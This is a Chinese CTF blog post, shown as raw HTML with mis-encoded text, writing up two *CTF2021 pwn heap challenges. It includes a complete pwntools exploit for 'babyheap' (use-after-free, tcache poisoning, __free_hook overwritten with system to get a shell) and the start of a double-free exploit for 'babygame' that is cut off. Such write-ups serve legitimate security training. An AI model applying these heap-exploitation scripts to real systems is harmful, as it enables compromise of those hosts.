<!DOCTYPE html>
<html lang="zh-CN" color-mode="light">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="keywords" content="" />
  <meta name="author" content="arttnba3" />
  <meta name="description" content="ã‚ãŒã„ãŸå¤¢ã‚’æ¨ã¦ã¦æºã‚Œã‚‹ä»Šæ—¥ã¯çœ ã£ã¦èª¤é­”åŒ–ã›" />
  
  
  <title>
    
      ã€CTF.0X02ã€‘*CTF2021-Pwn WP 
      
      
      |
    
     arttnba3&#39;s blog
  </title>

  
    <link rel="apple-touch-icon" href="/img/favicon.png">
    <link rel="icon" href="/img/favicon.png">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  
<link rel="stylesheet" href="/css/color-scheme.css">
<link rel="stylesheet" href="/css/base.css">
<link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css">
<link rel="stylesheet" href="/css/github-markdown.css">
<link rel="stylesheet" href="/css/highlight.css">
<link rel="stylesheet" href="/css/comments.css">

  <!-- ä»£ç å—é£æ ¼ -->
  

  <!-- jquery3.3.1 -->
  
    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
  

  <!-- fancybox -->
  
    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
  
  
<script src="/js/fancybox.js"></script>


  

  <script>
    var html = document.documentElement
    const colorMode = localStorage.getItem('color-mode')
    if (colorMode) {
      document.documentElement.setAttribute('color-mode', colorMode)
    }
  </script>
<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="arttnba3's blog" type="application/atom+xml">
</head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a target="_blank" rel="noopener" href="https://arttnba3.cn">
      <!-- å¤´åƒå–æ¶ˆæ‡’åŠ è½½ï¼Œæ·»åŠ no-lazy -->
      
        <img src="/img/avatar.png" alt="">
      
    </a>
    <div class="nickname"><a target="_blank" rel="noopener" href="https://arttnba3.cn">arttnba3's blog</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">Home</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">Archives</a>
        </li>
      
        <li class="nav-item" data-path="/categories/">
          <a href="/categories/">Categories</a>
        </li>
      
        <li class="nav-item" data-path="/tags/">
          <a href="/tags/">Tags</a>
        </li>
      
        <li class="nav-item" data-path="/friends/">
          <a href="/friends/">Friends</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">About</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="/js/activeNav.js"></script>



      <div class="flex-container">
        <!-- æ–‡ç« è¯¦æƒ…é¡µï¼Œå±•ç¤ºæ–‡ç« å…·ä½“å†…å®¹ï¼Œurlå½¢å¼ï¼šhttps://yoursite/æ–‡ç« æ ‡é¢˜/ -->
<!-- åŒæ—¶ä¸ºã€Œæ ‡ç­¾tagã€ï¼Œã€Œæœ‹å‹friendã€ï¼Œã€Œåˆ†ç±»categoriesã€ï¼Œã€Œå…³äºaboutã€é¡µé¢çš„æ‰¿è½½é¡µé¢ï¼Œå…·ä½“å±•ç¤ºå–å†³äºpage.type -->


  <!-- LaTex Display -->

  
    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
  
  <script>
    MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      }
    }
  </script>





  <!-- clipboard -->

  
    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
  
  
<script src="/js/codeCopy.js"></script>







  

  

  

  
  <!-- æ–‡ç« å†…å®¹é¡µ urlå½¢å¼ï¼šhttps://yoursite/æ–‡ç« æ ‡é¢˜/ -->
  <div class="container post-details" id="post-details">
    <div class="post-content">
      <div class="post-title">ã€CTF.0X02ã€‘*CTF2021-Pwn WP</div>
      <div class="post-attach">
        <span class="post-pubtime">
          <i class="iconfont icon-updatetime" title="æ›´æ–°æ—¶é—´"></i>
          2021-01-20 02:33:00
        </span>
        
              <span class="post-categories">
                <i class="iconfont icon-bookmark" title="åˆ†ç±»"></i>
                
                <span class="span--category">
                  <a href="/categories/CTF/" title="CTF">
                    <b>#</b> CTF
                  </a>
                </span>
                
              </span>
          
              <span class="post-tags">
                <i class="iconfont icon-tags" title="æ ‡ç­¾"></i>
                
                <span class="span--tag">
                  <a href="/tags/Pwn/" title="Pwn">
                    <b>#</b> Pwn
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" title="ä¿¡æ¯å®‰å…¨">
                    <b>#</b> ä¿¡æ¯å®‰å…¨
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/%E2%AD%90CTF/" title="â­CTF">
                    <b>#</b> â­CTF
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/%E5%A0%86/" title="å †">
                    <b>#</b> å †
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/CTF/" title="CTF">
                    <b>#</b> CTF
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/tcache-poisoning/" title="tcache poisoning">
                    <b>#</b> tcache poisoning
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/double-free/" title="double free">
                    <b>#</b> double free
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/Use-After-Free/" title="Use After Free">
                    <b>#</b> Use After Free
                  </a>
                </span>
                
              </span>
          
      </div>
      <div class="markdown-body">
        <p>C++pwnå¾ˆå¥½ç©ï¼Œå­©å­å¾ˆé«˜å…´ï¼ˆå› ä¸ºğŸ§ å·²ç»é€†ç‚¸äº†ï¼‰</p>
<span id="more"></span>

<h1 id="0x00-ç»ªè®º"><a href="#0x00-ç»ªè®º" class="headerlink" title="0x00.ç»ªè®º"></a>0x00.ç»ªè®º</h1><p>è´¨é‡æŒºé«˜çš„æ¯”èµ›ï¼Œå¯æƒœæˆ‘æ¯”è¾ƒèœ Or2â€¦</p>
<p>æ¯”èµ›çš„æ—¶å€™åœ¨æˆ‘èµ·åºŠä¹‹å‰å·¨çŠ‡é˜Ÿå‹å·²ç»æŠŠå‰é¢çš„ç®€å•é¢˜éƒ½å‡ºäº†ï¼ˆè†œä¸€è†œğŸ§yydsï¼‰ï¼Œåé¢çš„é¢˜æˆ‘éƒ½æ²¡åšå‡ºæ¥ï¼ˆå› ä¸ºæˆ‘å¤ªèœäº†QAQï¼‰ï¼Œå› æ­¤ä¸‹é¢çš„wpåŸºæœ¬ä¸Šéƒ½æ˜¯æœ¬åœ°å¤ç›˜XD</p>
<h1 id="0x01-babyheap-Use-After-Free-tcache-poisoning"><a href="#0x01-babyheap-Use-After-Free-tcache-poisoning" class="headerlink" title="0x01.babyheap - Use After Free + tcache poisoning"></a>0x01.babyheap - Use After Free + tcache poisoning</h1><blockquote>
<p> æ¯”è¾ƒç™½ç»™çš„ç­¾åˆ°é¢˜</p>
</blockquote>
<p><a href="/download/starCTF2021/pwn/babyheap.zip" title="ç‚¹å‡»æ­¤å¤„ä¸‹è½½åŸé¢˜">ç‚¹å‡»ä¸‹è½½-babyheap.zip</a></p>
<p>æƒ¯ä¾‹çš„checksecï¼Œä¿æŠ¤å…¨å¼€</p>
<p><img src="https://i.loli.net/2021/01/20/dNUGu8zEfwtoyn1.png" alt="AXQ_ZFH21P_~~AUA84UQH7H.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2021/01/20/Y5btDgrNvsm8j1T.png" alt="V6__6F0BSJGIF__91WSD_CY.png"></p>
<p><del>ä¸€  è§ˆ  æ—   ä½™</del>ï¼ˆ<del>ä¸åƒåé¢é‚£ä¸ªç¬¦å·è¡¨æ‰£å…‰çš„C++ pwn babygameäººéƒ½ç»™çœ‹å‚»äº†</del></p>
<p>ç¨‹åºæœ¬èº«æœ‰ç€<strong>åˆ†é…ã€åˆ é™¤ã€ä¿®æ”¹ã€æ‰“å°å †å—å†…å®¹</strong>çš„åŠŸèƒ½ï¼Œ<del>ç»™çš„é¢é¢ä¿±åˆ°ï¼Œååˆ†ç™½ç»™</del></p>
<p>æ¼æ´ç‚¹åœ¨äº<code>delete()</code>å‡½æ•°ä¸­freeåæ²¡æœ‰å°†æŒ‡é’ˆç½®NULLï¼Œ<strong>å­˜åœ¨ Use After Freeæ¼æ´</strong></p>
<p><img src="https://i.loli.net/2021/01/20/ZEwbcnI3X7J2Y8R.png"></p>
<p>åœ¨<code>add()</code>å‡½æ•°ä¸­æˆ‘ä»¬æœ‰ç€16ä¸ªå¯ç”¨çš„ä¸‹æ ‡ï¼Œä¸”åˆ†é…æ—¶ä¼šç›´æ¥è¦†å†™åŸæŒ‡é’ˆï¼Œå› æ­¤æˆ‘ä»¬å‡ ä¹æ˜¯å¯ä»¥åˆ†é…ä»»æ„ä¸ªchunkï¼Œä½†æ˜¯<strong>åªå…è®¸æˆ‘ä»¬åˆ†é…fastbin sizeèŒƒå›´çš„chunk</strong></p>
<p><img src="https://i.loli.net/2021/01/20/UEeKDiZ3hlbXBn9.png" alt="UAB1IY_NM_5GP_K2Y_4TL4V.png"></p>
<p>å› æ­¤è‹¥æƒ³è¦æ³„éœ²libcåœ°å€æˆ‘ä»¬éœ€è¦å€ŸåŠ©<code>malloc_consolidate()</code>å°†chunké€å…¥small binsä¸­</p>
<p>æ³¨æ„åˆ°<code>leaveYourName()</code>å‡½æ•°ä¸­ä¼šè°ƒç”¨malloc()åˆ†é…ä¸€ä¸ªå¤§chunkï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨è¯¥å‡½æ•°è§¦å‘<code>malloc_consolidate()</code>ï¼Œå°†fastbinä¸­chunké€å…¥smallbinï¼Œ ä»¥æ³„éœ²libcåŸºå€</p>
<p><img src="https://i.loli.net/2021/01/20/rH6nglJkI9Ne4WO.png" alt="~D9_XAV_4G5_FGKSMTED_13.png"></p>
<p>gdbè°ƒè¯•æˆ‘ä»¬å¯ä»¥å¾—çŸ¥è¯¥åœ°å€ä¸main_arenaé—´è·336ï¼Œå› è€Œæˆ‘ä»¬ä¾¿å¯ä»¥å¾—åˆ°libcåŸºå€</p>
<p><img src="https://i.loli.net/2021/01/20/CfJBNzhRyul5jAm.png"></p>
<p><strong>å°†è¿™ä¸ªsmall binå†åˆ†é…å›æ¥æˆ‘ä»¬å°±èƒ½å¤Ÿå®ç°chunk overlappingäº†ï¼Œç»§è€Œå°±æ˜¯é€šè¿‡ç¨‹åºçš„editåŠŸèƒ½å®ç°tcache poisoningä¿®æ”¹__free_hookä¸ºsystem()åfreeä¸€ä¸ªå†…å®¹ä¸ºâ€&#x2F;bin&#x2F;shâ€çš„chunkå³å¯get shell</strong></p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯<code>edit()</code>å‡½æ•°ä¸­æ˜¯<strong>ä»bkçš„ä½ç½®å¼€å§‹è¾“å…¥</strong>çš„ï¼Œå› è€Œæˆ‘ä»¬çš„fake chunkéœ€è¦æ„é€ åˆ°<code>__free_hook - 8 </code>çš„ä½ç½®</p>
<p><img src="https://i.loli.net/2021/01/20/uBnYrSZptINMikh.png" alt="image.png"></p>
<p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>) <span class="comment"># p = remote(&#x27;52.152.231.198&#x27;, 8081)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>) <span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">index:<span class="built_in">int</span>, size:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;input index&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;input size&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;input index&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;input index&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;input content&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;input index&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leaveYourName</span>(<span class="params">content</span>):</span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;your name:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        new(i, <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># chunk 15 to prevent consolidate forward, so that we can get a smallbin chunk</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">        delete(i)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># malloc_consolidate() to get a smallbin chunk, leak libc addr</span></span><br><span class="line">    leaveYourName(<span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    dump(<span class="number">7</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">336</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.info(<span class="string">&quot;Libc addr:&quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#tcache poisoning</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        new(i, <span class="number">0x10</span>)</span><br><span class="line">    new(<span class="number">7</span>, <span class="number">0x60</span>)</span><br><span class="line">    edit(<span class="number">7</span>, p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>))</span><br><span class="line">    delete(<span class="number">10</span>)</span><br><span class="line">    delete(<span class="number">9</span>)</span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line">    edit(<span class="number">7</span>, p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0x21</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] - <span class="number">8</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># overwrite __free_hook</span></span><br><span class="line">    new(<span class="number">10</span>, <span class="number">0x10</span>)</span><br><span class="line">    new(<span class="number">9</span>, <span class="number">0x10</span>)</span><br><span class="line">    edit(<span class="number">9</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the shell</span></span><br><span class="line">    edit(<span class="number">7</span>, p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0x21</span>) + <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get shell</p>
<p><img src="https://i.loli.net/2021/01/20/NFqcz781vACTKPB.png"></p>
<h1 id="0x02-babygame-double-free-tcache-poisoning"><a href="#0x02-babygame-double-free-tcache-poisoning" class="headerlink" title="0x02.babygame - double free + tcache poisoning"></a>0x02.babygame - double free + tcache poisoning</h1><blockquote>
<p>è®¾è®¡å¾ˆå·§å¦™çš„ä¸€é“é¢˜ï¼Œä»¥åŠæˆ‘å·®ä¸å¤šæ˜¯ç¡¬è°ƒå‡ºæ¥çš„ï¼ˆ</p>
</blockquote>
<p><a href="/download/starCTF2021/pwn/babygame.zip" title="ç‚¹å‡»æ­¤å¤„ä¸‹è½½åŸé¢˜">ç‚¹å‡»ä¸‹è½½-babygame.zip</a></p>
<p>æƒ¯ä¾‹çš„checksecï¼Œä¿æŠ¤å…¨å¼€</p>
<p><img src="https://i.loli.net/2021/01/20/y7LnNfmzYWPuc9G.png" alt="image.png"></p>
<p>è¿è¡Œä¸€ä¸‹ï¼Œå¤§æ¦‚å¯ä»¥çŸ¥é“è¿™æ˜¯ä¸€ä¸ªæ¨ç®±å­å°æ¸¸æˆ</p>
<p><img src="https://i.loli.net/2021/01/22/7NYPhxkrXisWUqB.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼Œ<del>ç¬¦å·è¡¨è¢«æ‰£å…‰ï¼Œåˆ†æå‡ºä¸€å¨shit</del></p>
<blockquote>
<p>éƒ¨åˆ†å‡½æ•°ã€å˜é‡åç»é‡å‘½å</p>
</blockquote>
<p>åœ¨ä¸€å¼€å§‹æ—¶ä¼šåˆ†é…ä¸€ä¸ªå¤§å°ä¸º0x500çš„chunkï¼Œ<strong>è¶…å‡ºäº†tcacheçš„èŒƒå›´</strong>ï¼Œåœ¨<strong>freeæ—¶ä¼šè¢«ç›´æ¥æ”¾å…¥Unsorted Binä¸­</strong></p>
<p><img src="https://i.loli.net/2021/01/22/6i8zvdhmw31ekBn.png" alt="image.png"></p>
<p>åœ¨å°è¯•é€€å‡ºæ—¶å¯ä»¥è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæœ€åä¼šfreeæ‰è¿™ä¸ª0x500çš„å¤§chunkï¼Œä½†æ˜¯åé¢æˆ‘ä»¬åˆå¯ä»¥é‡æ–°å°†è¿™ä¸ªchunkç”³è¯·å›æ¥ï¼ˆé€šè¿‡ç¨‹åºçš„restartåŠŸèƒ½ï¼‰ï¼Œ<strong>è¿™ä¸ªæ—¶å€™å°±ä¼šåœ¨chunkä¸Šæ®‹ç•™æŒ‡å‘main_arena + 96çš„æŒ‡é’ˆ</strong></p>
<p><img src="https://i.loli.net/2021/01/22/gXxwGDlWqTkPVLK.png" alt="image.png"></p>
<p>åŒæ—¶ï¼Œé¢˜ç›®ä¸­æœ‰ç€æ‰“å°è¯¥chunkçš„åŠŸèƒ½ï¼Œé€šè¿‡freeåé‡æ–°mallocçš„æ–¹å¼<strong>æˆ‘ä»¬ä¾¿å¯ä»¥è·å¾—libcçš„åŸºå€</strong></p>
<p><img src="https://i.loli.net/2021/01/22/6W2lrHsLmZ7hRvE.png" alt="image.png"></p>
<p>é¢˜ç›®çš„æ¼æ´ç‚¹åœ¨äºå½“ä½ <strong>æˆåŠŸé€šè¿‡ä¸€å…³åå†é€‰æ‹©ä¸‹ä¸€å…³ä¹‹åé€‰æ‹©é€€å‡ºä¾¿ä¼šå¯¼è‡´double free</strong></p>
<p><img src="https://i.loli.net/2021/01/22/AR2OPinM8D5Kaeu.png"></p>
<p>gdbè°ƒè¯•ï¼Œæˆ‘ä»¬å°†æ–­ç‚¹ä¸‹åœ¨<code>malloc_printerr()</code>å‡½æ•°å¤„ï¼Œå…¶ä¸Šå±‚è°ƒç”¨å‡½æ•°ä¸º<code>_int_free(mstate av, mchunkptr p, int have_lock)</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬<strong>ä¾¿å¯ä»¥ä»rsiå¯„å­˜å™¨å¤„è·å–åˆ°è¢«double freeçš„chunkçš„åœ°å€</strong></p>
<p><img src="https://i.loli.net/2021/01/23/XtUISQ2ckoZgbsz.png"></p>
<p>å…¶sizeä¸º<code>0x61</code></p>
<p><img src="https://i.loli.net/2021/01/23/D2uwcevXVQsqJih.png"></p>
<p><del>ç»å†äº†åœ¨IDAä¸­è‹¦è‹¦å“€åšæ— æ•°å°æ—¶å</del>è¿›è¡ŒåŠ¨æ€è°ƒå¼æ—¶è§‚å¯Ÿåˆ°å¯¹äºç¨‹åºçš„leave your nameåŠŸèƒ½å…¶ä¼šæ ¹æ®è¾“å…¥çš„é•¿åº¦åˆ†é…ç›¸åº”å¤§å°çš„å †å—</p>
<p><img src="https://i.loli.net/2021/01/23/6RWdGglwUM8ntLO.png"></p>
<p><img src="https://i.loli.net/2021/01/23/DdY3TGBJjmfSkVP.png"></p>
<p>åŒæ—¶è§‚å¯Ÿåˆ°<strong>è¯¥ç±»å‹å †å—ä¸ä¼šè¢«é‡Šæ”¾ï¼Œè€Œæ˜¯ä¼šæ¯æ¬¡è¾“å…¥éƒ½ç”³è¯·ä¸€æ¬¡</strong></p>
<p><img src="https://i.loli.net/2021/01/23/Hnj1BqmPCirKRLk.png"></p>
<p><img src="https://i.loli.net/2021/01/23/wSIONf7Epij3lCq.png"></p>
<p>é‚£ä¹ˆæˆ‘ä»¬ä¾¿å¯ä»¥<strong>åˆ©ç”¨ç¨‹åºçš„leave your nameåŠŸèƒ½ç”³è¯·ä»»æ„æ¬¡æ•°çš„ä»»æ„å¤§å°çš„å †å—</strong></p>
<p>åŒæ—¶<strong>é¢˜ç›®æ‰€ç»™çš„libcä¸ºå¯ä»¥è¿›è¡Œtcache double freeçš„2.27ç‰ˆæœ¬</strong></p>
<p><img src="https://i.loli.net/2021/01/22/YpaDTSGX2mLBzvQ.png"></p>
<p>åŒæ—¶<strong>åœ¨messageåŠŸèƒ½ä¸­æˆ‘ä»¬æ˜¯å¯ä»¥å¾€0x500çš„å¤§chunkä¸­å†™å…¥å†…å®¹çš„ï¼Œè€Œåœ¨ç¨‹åºé€€å‡ºæ—¶è¯¥chunkä¼šè¢«é‡Šæ”¾</strong></p>
<p><img src="https://i.loli.net/2021/01/23/Ga3ehQvfPrDdLpJ.png"></p>
<p>é‚£ä¹ˆæˆ‘ä»¬ä¾¿è€ƒè™‘<strong>å…ˆæ³„éœ²libcåœ°å€åé€šè¿‡double freeæ„é€ tcache poisoningè¿›è¡Œä»»æ„åœ°å€å†™æ”¹å†™__free_hookä¸ºsystemå‡½æ•°åé€šè¿‡messageåŠŸèƒ½åˆ›å»ºå†…å®¹ä¸ºâ€&#x2F;bin&#x2F;shâ€çš„å †å—åé€€å‡ºä½¿å¾—è¯¥å †å—è¢«é‡Šæ”¾å³å¯get shell</strong></p>
<p>æœ€åæ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>, env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>:<span class="string">&#x27;./libc.so.6&#x27;</span>&#125;) <span class="comment"># p = remote(&#x27;52.152.231.198&#x27;, 8082)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">double_free</span>():</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an level from 1-9:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;w&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;s&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span 